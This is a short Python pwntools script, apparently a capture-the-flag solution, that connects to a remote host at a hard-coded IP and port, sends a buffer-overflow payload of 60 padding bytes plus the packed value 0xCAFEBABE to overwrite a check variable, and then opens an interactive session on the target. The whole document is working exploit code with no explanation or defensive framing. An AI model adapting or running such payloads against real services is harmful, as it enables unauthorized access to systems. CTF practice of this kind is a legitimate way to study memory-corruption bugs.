from pwn import *
r = remote("65.2.136.80", 32374)
payload = b"a"*60 + p64(0xCAFEBABE)
r.sendline(payload)
r.interactive()